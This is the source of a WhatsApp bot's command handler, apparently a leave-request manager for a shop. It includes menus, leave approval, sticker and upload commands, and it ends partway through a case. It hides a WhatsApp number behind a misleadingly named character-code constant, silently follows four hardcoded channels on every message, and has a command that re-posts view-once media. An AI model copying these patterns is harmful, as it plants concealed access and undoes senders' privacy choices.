/**
 * youtube : https://youtube.com/@slnckyami
*/

require('./config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const crypto = require('crypto');
const { SnackVideo } = require('./lib/function/snackvideo')
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = kyami = async (kyami, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? kyami.user.id.split(":")[0] + "@s.whatsapp.net" || kyami.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        
        const sscnumber = JSON.parse(fs.readFileSync("./lib/database/sellersc.json"))
        const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
        const pler = JSON.parse(fs.readFileSync('./command/idgrup.json').toString())
        const aksesGB = m.isGroup ? pler.includes(m.chat) : false
        const botNumber = await kyami.decodeJid(kyami.user.id);
        const isSellerSc = sscnumber.includes(senderNumber)
        const isKyamiSilence = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const SlncKyami = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await kyami.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=94760405102:+94 76 040 5102\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
        const reply = (teks) => {
kyami.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.namaBot}`,
"body": `${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://img1.pixhost.to/images/5787/599046902_kyami.jpg',
"sourceUrl": 'https://github.com/MrNadun'}}},
{ quoted: qkontak})
}
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
            } = require('./lib/myfunction');
             //theme sticker reply
        const kyamiwet = () => {
        let KyamiStikRep = fs.readFileSync('./lib/sticker_reply/wait.webp')
        kyami.sendMessage(from, { sticker: KyamiStikRep }, { quoted: m })
        }
        const kyamiadmn = () => {
        let KyamiStikRep = fs.readFileSync('./lib/sticker_reply/admin.webp')
        kyami.sendMessage(from, { sticker: KyamiStikRep }, { quoted: m })
        }
        const kyamibotadmin = () => {
        let KyamiStikRep = fs.readFileSync('./lib/sticker_reply/botadmin.webp')
        kyami.sendMessage(from, { sticker: KyamiStikRep }, { quoted: m })
        }
        const kyamiowner = () => {
        let KyamiStikRep = fs.readFileSync('./lib/sticker_reply/owner.webp')
        kyami.sendMessage(from, { sticker: KyamiStikRep }, { quoted: m })
        }
        const kyamiongb = () => {
        let KyamiStikRep = fs.readFileSync('./lib/sticker_reply/group.webp')
        kyami.sendMessage(from, { sticker: KyamiStikRep }, { quoted: m })
        }
        const kyamipriv = () => {
        let KyamiStikRep = fs.readFileSync('./lib/sticker_reply/prem.webp')
        kyami.sendMessage(from, { sticker: KyamiStikRep }, { quoted: m })
        }
        kyami.newsletterFollow('120363366790950043@newsletter')
        kyami.newsletterFollow('120363402156788257@newsletter')
        kyami.newsletterFollow('120363415603332542@newsletter')
        kyami.newsletterFollow('120363417441336114@newsletter')
        let cihuy = fs.readFileSync('./lib/media/th.jpg')
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   📅 Date : ${new Date().toLocaleString()} \n` +
                    `   👤 User : ${m.body || m.mtype} \n` +
                    `   ✨ Name : ${pushname} \n` +
                    `   📌 JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   🍀 Grup: ${groupName} \n` +
                        `   📍 GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            kyami.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}

        
        async function loading() {
    return reply("Sedang memuat Wak...");
}
// ====== Paths ======
    const leaveDBPath = path.join(__dirname, "database", "leave.json");
    const leaveDir = path.dirname(leaveDBPath);

    // ====== Ensure Directory Exists ======
    if (!fs.existsSync(leaveDir)) {
      fs.mkdirSync(leaveDir, { recursive: true });
      console.log("Created 'database' folder.");
    }

    // ====== Load Leave Database Safely ======
    function loadLeaveDB() {
      const defaultDB = { fullLeaves: [], halfLeaves: [] };

      if (!fs.existsSync(leaveDBPath)) {
        fs.writeFileSync(leaveDBPath, JSON.stringify(defaultDB, null, 2));
        console.log("Initialized new leave.json file.");
        return defaultDB;
      }

      const content = fs.readFileSync(leaveDBPath, "utf8");
      try {
        const parsed = JSON.parse(content || "{}");
        return {
          fullLeaves: Array.isArray(parsed.fullLeaves) ? parsed.fullLeaves : [],
          halfLeaves: Array.isArray(parsed.halfLeaves) ? parsed.halfLeaves : [],
        };
      } catch (err) {
        console.error("Invalid JSON in leave.json. Reinitializing...");
        fs.writeFileSync(leaveDBPath, JSON.stringify(defaultDB, null, 2));
        return defaultDB;
      }
    }

    // ====== Save Leave Database ======
    function saveLeaveDB(db) {
      try {
        fs.writeFileSync(leaveDBPath, JSON.stringify(db, null, 2));
        console.log("Database saved successfully.");
      } catch (err) {
        console.error("Error saving database:", err);
      }
    }

    // ====== Helper: Date Generator ======
    function generateNextDates(count = 14) {
      const now = new Date();
      const dates = [];
      for (let i = 0; i < count; i++) {
        const d = new Date(now);
        d.setDate(now.getDate() + i);
        const dateStr = `${d.getFullYear()}.${d.getMonth() + 1}.${d.getDate()}`;
        dates.push(dateStr);
      }
      return dates;
    }

    // ====== Example Usage ======
    function addTodayToFullLeaves() {
      const db = loadLeaveDB();
      const today = generateNextDates(1)[0];

      if (!db.fullLeaves.includes(today)) {
        db.fullLeaves.push(today);
        console.log(`Added ${today} to fullLeaves.`);
        saveLeaveDB(db);
      } else {
        console.log(`${today} is already in fullLeaves.`);
      }
    }
   switch (command) {
            case "menu": {
    let menu = 
`👋 𝙷𝚎𝚕𝚕𝚘 *${pushname}.* 𝙸'𝚖 ${namaBot} 🙂 \n> ❮ 𝚃𝚑𝚒𝚜 𝚒𝚜 𝚖𝚢 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚕𝚒𝚜𝚝 ❯          \n\n
╭──☉ ❮ 𝗠𝗘𝗡𝗨 ❯
│✎.ʟᴇᴀᴠᴇ
│✎.ᴘʀɪᴠᴀᴛᴇ
│✎.ᴘᴜʙʟɪᴄ
│✎.ᴀᴅᴅᴘʀᴇᴍ
│✎.ᴅᴇʟᴘʀᴇᴍ
│✎.ʜɪᴅᴇᴛᴀɢ
│✎.ᴛᴀɢᴀʟʟ
│✎.ᴠᴠ
╰─────────────☉`
kyami.sendMessage(m.chat, {
  footer: foother,
  buttons: [
           {
            name: "cta_url",
            buttonParamsJson: `{\"display_text\":\"BuyMore.lk\",\"url\":\"https://www.buymore.lk\",\"merchant_url\":\"https://www.buymore.lk\"}`
 }
 ],
headerType: 1,
        viewOnce: true,
        image: { url: thumbnel },
        caption: menu,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: namaBot,
                body: namafile,
                thumbnailUrl: thumbnail,
                sourceUrl: ch,
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, {
        quoted: qkontak
    })
}
break;
case "help": {
    let help = 
`👋 𝙷𝚎𝚕𝚕𝚘 *${pushname}.* Don't you understand how I'm being used?🙂\n> ❮ 𝙷𝚘𝚠 𝚝𝚘 𝚞𝚜𝚎 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜 ❯          \n\n
╭──☉ ❮ 𝙐𝙎𝙀𝘼𝙂𝙀 ❯
│┬🍀 .𝘭𝘦𝘢𝘷𝘦 
│╰╴╴✪ < Request a leave >
│┬🍀 .𝘱𝘳𝘪𝘷𝘢𝘵𝘦 
│╰╴╴✪ < Work only private >
│┬🍀 .𝘱𝘶𝘣𝘭𝘪𝘤
│╰╴╴✪ < Work only public >
│┬🍀 .𝘩𝘪𝘥𝘦𝘵𝘢𝘨
│╰╴╴✪ Tagging group members invisibly
│┬🍀 .𝘵𝘢𝘨𝘢𝘭𝘭
│╰╴╴✪ tagging all group members
│┬🍀 .𝘷𝘷
│╰╴╴✪ Read view ones msg
╰─────────────☉`
kyami.sendMessage(m.chat, {
  footer: foother,
  buttons: [
           {
            name: "cta_url",
            buttonParamsJson: `{\"display_text\":\"BuyMore.lk\",\"url\":\"https://www.buymore.lk\",\"merchant_url\":\"https://www.buymore.lk\"}`
 }
 ],
headerType: 1,
        viewOnce: true,
        image: { url: thumbnel },
        caption: help,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: namaBot,
                body: namafile,
                thumbnailUrl: thumbnail,
                sourceUrl: ch,
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, {
        quoted: qkontak
    })
}
break;
case "leave":
case "l": {
  // 🕓 Get current date info
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, "0"); // 01 - 12

  // Generate the next 14 days dynamically
  const dateRows = [];
  for (let i = 0; i < 14; i++) {
    const future = new Date(now);
    future.setDate(now.getDate() + i);
    const y = future.getFullYear();
    const m = String(future.getMonth() + 1).padStart(2, "0");
    const d = future.getDate();
    dateRows.push({
      title: `📅 ${y}.${m}.${d}`,
      id: `.gl ${y}.${m}.${d}`
    });
  }

  // 🧠 Build the message
  let requestLeave = 
`🤓 Hey *${pushname},* Do you want a leave?\n📅 Then choose the day you want a Leave. `;

  //  Build the button section dynamically
  const leaveSelect = {
    buttonId: "action",
    buttonText: { displayText: "📅 Click Here" },
    type: 4,
    nativeFlowInfo: {
      name: "single_select",
      paramsJson: JSON.stringify({
        title: "📅 Click Here",
        sections: [
          {
            title: "🙂 Select Your Leave 👇",
            rows: dateRows, // ← dynamic date list
          },
        ],
      }),
    },
  };

  // Send message
  kyami.sendMessage(
    m.chat,
    {
      footer: foother,
      buttons: [
        {
          buttonId: `.owner`,
          buttonText: { displayText: "❮ 👤Owner ❯" },
          type: 1,
        },
        {
          buttonId: `.menu`,
          buttonText: { displayText: "❮ 📜Menu ❯" },
          type: 1,
        },
        leaveSelect, // dynamic button
      ],
      headerType: 1,
      viewOnce: true,
      image: { url: thumbnel },
      caption: requestLeave,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: namaBot,
          body: namafile,
          thumbnailUrl: thumbnail,
          sourceUrl: ch,
          mediaType: 1,
          renderLargerThumbnail: false,
        },
      },
    },
    { quoted: qkontak }
  );
}
break;
case "gl": {
  let giveLeave = 
`📅 *A Leave Request* 📅

╔══❮ 𝙻𝚎𝚊𝚟𝚎 𝚒𝚗𝚏𝚘 ❯
║👤 User :- ${pushname}
║📝 Leave Date :- *${text}*
║⏰ Requested Time :- ${new Date().toLocaleString()}
╚════════─────○

> Dear ${pushname}, Your leave is currently pending. Please wait until it is approved or rejected.`

  const sentMsg = await kyami.sendMessage(m.chat, {
    footer: foother,
    buttons: [
      { buttonId: `.approve ${m.key.id}`, buttonText: { displayText: '❮ ✅ Approve ❯' }, type: 1 },
      { buttonId: `.reject ${m.key.id}`, buttonText: { displayText: '❮ ❌ Reject ❯' }, type: 1 }
    ],
    headerType: 1,
    image: { url: thumbnel },
    caption: giveLeave,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: namaBot,
        body: namafile,
        thumbnailUrl: thumbnail,
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
  }, { quoted: qkontak })

  const db = loadLeaveDB();
  db.fullLeaves.push({
    user: m.sender,
    name: pushname,
    date: text,
    status: "pending",
    requestedAt: new Date().toISOString()
  });
  saveLeaveDB(db);

  global.lastLeaveMsg = { chat: m.chat, key: sentMsg.key, user: m.sender, name: pushname, date: text }
}
break
       case "approve": {
           // Check if there's a pending leave request
           if (!global.lastLeaveMsg) {
               return reply("❌ No pending leave requests found. Please make sure a leave request is currently waiting for approval.");
           }

           // Validate lastLeaveMsg structure
           if (!global.lastLeaveMsg.user || !global.lastLeaveMsg.chat || !global.lastLeaveMsg.key) {
               delete global.lastLeaveMsg; // Clear corrupted data
               return reply("❌ Invalid leave request data. Please ask the user to submit a new leave request.");
           }

           const senderNumber = m.sender.split("@")[0];
           if (!global.owner.includes(senderNumber)) {
               return reply("❌ Sorry, you are not authorized to approve leave requests.");
           }

           const { chat, key, user, name, date } = global.lastLeaveMsg;

           try {
               // Delete the original leave message
               await kyami.sendMessage(chat, { delete: key });

               // Update database
               const db = loadLeaveDB();
               const leaveIndex = db.fullLeaves.findIndex(leave => 
                   leave.user === user && leave.status === "pending"
               );

               if (leaveIndex !== -1) {
                   db.fullLeaves[leaveIndex].status = "approved";
                   db.fullLeaves[leaveIndex].approvedBy = m.sender;
                   db.fullLeaves[leaveIndex].approvedAt = new Date().toISOString();
                   saveLeaveDB(db);
               }

               // Notify in group
               await kyami.sendMessage(m.chat, {
                   text: `✅ Leave request from @${user.split("@")[0]} has been *approved*! 🎉\n📅 Date: ${date || 'Not specified'}`,
                   mentions: [user],
               });

               // DM the requester
               await kyami.sendMessage(user, {
                   text: `🎉 Hello *${name}*, your leave request has been *approved* by management! Enjoy your time off 😎\n📅 Date: ${date || 'Not specified'}`,
               });

               // Clear the stored message
               delete global.lastLeaveMsg;

           } catch (error) {
               console.error("Error approving leave:", error);
               reply("❌ Failed to process approval. Please try again.");
           }
       }
       break;

case "reject": {
  if (!global.lastLeaveMsg) return m.reply("No pending leave requests found.");

  const senderNumber = m.sender.split("@")[0];
  if (!global.owner.includes(senderNumber)) {
    return m.reply("❌ Sorry, you are not an owner.");
  }

  const requester = global.lastLeaveMsg.user;
  const requesterName = global.lastLeaveMsg.name;
  const { chat, key, user, date } = global.lastLeaveMsg;

  await kyami.sendMessage(chat, { delete: key });

  const db = loadLeaveDB();
  const leaveIndex = db.fullLeaves.findIndex(leave => 
    leave.user === user && leave.status === "pending"
  );
  if (leaveIndex !== -1) {
    db.fullLeaves[leaveIndex].status = "rejected";
    db.fullLeaves[leaveIndex].rejectedBy = m.sender;
    db.fullLeaves[leaveIndex].rejectedAt = new Date().toISOString();
    saveLeaveDB(db);
  }

  await kyami.sendMessage(m.chat, {
    text: `❌ The leave request from @${requester.split("@")[0]} has been *rejected*.`,
    mentions: [requester],
  });

  await kyami.sendMessage(requester, {
    text: `😞 Hello *${requesterName}*, unfortunately your leave request was *rejected* by your manager.`,
  });

  delete global.lastLeaveMsg;
}
break;   
case "halfleave":
case "hl": {
  let requestHalfLeave = `
🕒 Hey *${pushname}.* \nDo you want a half leave? 😁 Then choose the time you want.✨`;

  //Define possible time slots
  const timeSlots = [
    "09:00 AM",
    "10:00 AM",
    "11:00 AM",
    "12:30 PM",
    "02:00 PM",
    "03:30 PM",
    "04:00 PM",
    "05:00 PM",
  ];

  // Convert time slots to selectable rows
  const timeRows = timeSlots.map((time) => ({
    title: `🕐 ${time}`,
    id: `.halfconfirm ${time}`,
  }));

  // Build interactive button (native select menu)
  const halfSelect = {
    buttonId: "action",
    buttonText: { displayText: "🕐 Select Time" },
    type: 4,
    nativeFlowInfo: {
      name: "single_select",
      paramsJson: JSON.stringify({
        title: "🕐 Select Your Half Leave Time",
        sections: [
          {
            title: "🕘 Choose When You’ll Leave",
            rows: timeRows,
          },
        ],
      }),
    },
  };

  // 📩 Send message
  kyami.sendMessage(
    m.chat,
    {
      footer: foother,
      buttons: [
        {
          buttonId: `.owner`,
          buttonText: { displayText: "❮ 👤Owner ❯" },
          type: 1,
        },
        {
          buttonId: `.menu`,
          buttonText: { displayText: "❮ 📜Menu ❯" },
          type: 1,
        },
        halfSelect,
      ],
      headerType: 1,
      viewOnce: true,
      image: { url: thumbnel },
      caption: requestHalfLeave,
      contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: namaBot,
          body: namafile,
          thumbnailUrl: thumbnail,
          sourceUrl: ch,
          mediaType: 1,
          renderLargerThumbnail: false,
        },
      },
    },
    { quoted: qkontak }
  );
}
break;
case "halfconfirm": {
  let time = text.trim();
  let halfLeaveMessage = `
🕒 *Half Leave Request* 🕒

👤 User: ${pushname}
⏰ Time: *${time}*
📅 Requested: ${new Date().toLocaleString()}

> Dear ${pushname}, your half-leave request is pending. Please wait until it’s approved or rejected.
`;

  const sentMsg = await kyami.sendMessage(m.chat, {
    footer: foother,
    buttons: [
      {
        buttonId: `.approvehalf ${m.sender}`,
        buttonText: { displayText: "✅ Approve" },
        type: 1,
      },
      {
        buttonId: `.rejecthalf ${m.sender}`,
        buttonText: { displayText: "❌ Reject" },
        type: 1,
      },
    ],
    headerType: 1,
    image: { url: thumbnel },
    caption: halfLeaveMessage,
  });

  const db = loadLeaveDB();
  db.halfLeaves.push({
    user: m.sender,
    name: pushname,
    time: time,
    status: "pending",
    requestedAt: new Date().toISOString()
  });
  saveLeaveDB(db);

  global.lastHalfLeave = {
    chat: m.chat,
    key: sentMsg.key,
    user: m.sender,
    name: pushname,
    time: time,
  };
}
break;
case "approvehalf": {
  const senderNumber = m.sender.split("@")[0];
  if (!global.owner.includes(senderNumber))
    return m.reply("❌ Sorry, you are not an owner.");

  if (!global.lastHalfLeave) return m.reply("No pending half-leave requests.");

  const { chat, key, user, name, time } = global.lastHalfLeave;

  await kyami.sendMessage(chat, { delete: key });

  const db = loadLeaveDB();
  const leaveIndex = db.halfLeaves.findIndex(leave => 
    leave.user === user && leave.status === "pending"
  );
  if (leaveIndex !== -1) {
    db.halfLeaves[leaveIndex].status = "approved";
    db.halfLeaves[leaveIndex].approvedBy = m.sender;
    db.halfLeaves[leaveIndex].approvedAt = new Date().toISOString();
    saveLeaveDB(db);
  }

  await kyami.sendMessage(m.chat, {
    text: `✅ Half leave request from @${user.split("@")[0]} for *${time}* has been approved! 🎉`,
    mentions: [user],
  });

  await kyami.sendMessage(user, {
    text: `🎉 Hello *${name}*, your half-leave request for *${time}* has been *approved*! Enjoy your time off 😎`,
  });

  delete global.lastHalfLeave;
}
break;

case "rejecthalf": {
  const senderNumber = m.sender.split("@")[0];
  if (!global.owner.includes(senderNumber))
    return m.reply("❌ Sorry, you are not an owner.");

  if (!global.lastHalfLeave) return m.reply("No pending half-leave requests.");

  const { chat, key, user, name, time } = global.lastHalfLeave;

  await kyami.sendMessage(chat, { delete: key });

  const db = loadLeaveDB();
  const leaveIndex = db.halfLeaves.findIndex(leave => 
    leave.user === user && leave.status === "pending"
  );
  if (leaveIndex !== -1) {
    db.halfLeaves[leaveIndex].status = "rejected";
    db.halfLeaves[leaveIndex].rejectedBy = m.sender;
    db.halfLeaves[leaveIndex].rejectedAt = new Date().toISOString();
    saveLeaveDB(db);
  }

  await kyami.sendMessage(m.chat, {
    text: `❌ Half leave request from @${user.split("@")[0]} for *${time}* has been rejected.`,
    mentions: [user],
  });

  await kyami.sendMessage(user, {
    text: `😞 Hello *${name}*, your half-leave request for *${time}* has been *rejected* by your manager.`,
  });

  delete global.lastHalfLeave;
}
break;
case "leavelog":
case "ll": {
  if (!global.owner.includes(senderNumber)) return reply("❌ Sorry, you are not an owner.");
  const db = loadLeaveDB();

  const fullList = db.fullLeaves
    .map((x, i) => `📅 ${i + 1}. ${x.name}\nDate: ${x.date}\nStatus: ${x.status}`)
    .join("\n\n");
  const halfList = db.halfLeaves
    .map((x, i) => `🕐 ${i + 1}. ${x.name}\nTime: ${x.time}\nStatus: ${x.status}`)
    .join("\n\n");

  const msg = `📁 *BuyMore Leave Records*\n\n🌕 *Full Day Leaves:*\n${fullList || "_No full leaves_"}\n\n🌗 *Half Day Leaves:*\n${halfList || "_No half leaves_"}`;
  reply(msg);
}
break;
          case "rvo": {
if (!m.quoted) return reply(
`*❌Syntax Error!!*
*Example:* Reply ViewOnce with caption ${prefix + command}`);
await kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await kyami.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await kyami.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await kyami.sendMessage(m.chat, { 
audio: buffer, 
mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return reply("❌ Media View Once tidak didukung.");
}} catch (err) {
console.error(err)}}
break;
case "tourl": {
if (!/image/.test(mime)) return reply("dengan kirim/reply foto")
await kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let media = await kyami.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'kyami.png');

let teks = directLink.toString()
await kyami.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case "tourl": case "tourl2": {
if (!/image|video/.test(mime)) return m.reply(example("dengan reply foto/vidio"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
await kyami.sendMessage(m.chat, {text: `*Url :* ${dd}\n*Expired :* Permanen`}, {quoted: m})
}
break
case 'owner': {
    let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp; ${global.ownerName}\nORG: ${global.ownerName}\nTITLE:soft\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:Ponsel\nitem2.URL:${global.yt}\nitem2.X-ABLabel:ðŸ’¬ More\nitem3.EMAIL;type=INTERNET: ${global.website}\nitem3.X-ABLabel:Email\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABADR:ðŸ’¬ More\nitem4.X-ABLabel:Lokasi\nEND:VCARD`;
const sentMsg = await kyami.sendMessage(m.chat, {
      contacts: {
        displayName: author,
        contacts: [{ vcard }],
      },
      contextInfo: {
        externalAdReply: {
          title: "M R - N A D U N",
          body: "",
          thumbnailUrl: `https://img1.pixhost.to/images/5890/601642973_skyzopedia.jpg`,
          mediaType: 1,
          showAdAttribution: false,
          renderLargerThumbnail: true,
        }}}, { quoted: qkontak });
}
break
case "brat": {
if (!text) return reply('teksnya')
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=false`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await kyami.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kyami.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await kyami.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case "listprem": {
if (!isKyamiSilence) return reply(mess.owner)
if (premium.length < 1) return reply("𝘕𝘰 𝘏𝘢𝘷𝘦 𝘜𝘴𝘦𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 :(")
let teks = `\n𝘓𝘪𝘴𝘵 𝘈𝘭𝘭 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
kyami.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: qkontak})
}
break
case "addprem": {
if (!isKyamiSilence) return kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
